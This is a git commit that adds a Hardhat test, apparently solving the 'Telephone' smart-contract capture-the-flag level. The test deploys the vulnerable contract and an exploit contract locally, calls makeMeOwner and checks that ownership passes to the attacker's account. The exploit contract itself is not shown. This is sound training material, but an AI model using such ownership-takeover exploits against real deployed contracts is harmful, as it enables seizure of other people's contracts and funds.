3cb4b08b91526c8110879c993763bcd4aff4dfd6
rami-majdoub <rami.majdoub1@gmail.com>
2022-12-26 19:11:46 +0100

    Telephone

---
+++ test/TelephoneExpolit.ts
@@ -0,0 +1,31 @@
+import { time, loadFixture } from "@nomicfoundation/hardhat-network-helpers";
+import { anyValue } from "@nomicfoundation/hardhat-chai-matchers/withArgs";
+import { expect } from "chai";
+import { ethers } from "hardhat";
+
+describe.only("Telephone expolit", function () {
+  it("Should make caller owner", async function () {
+
+    const [deployer] = await ethers.getSigners();
+    const TelephoneFactory = await ethers.getContractFactory("Telephone");
+    const telephone = await TelephoneFactory.deploy();
+    await telephone.deployed();
+    
+    console.log('telephone deployed at:'+ telephone.address);
+
+    const TelephoneExpolitFactory = await ethers.getContractFactory("TelephoneExpolit");
+    const telephoneExpolit = await TelephoneExpolitFactory.deploy();
+    await telephoneExpolit.deployed();
+
+    await telephoneExpolit.deployed();
+
+    console.log('Exploit deployed at:'+ telephoneExpolit.address);
+
+    await telephoneExpolit.makeMeOwner(telephone.address);
+
+  	expect(
+	  	await telephone.owner()
+	  ).to.equal(deployer.address)
+    
+  });
+});
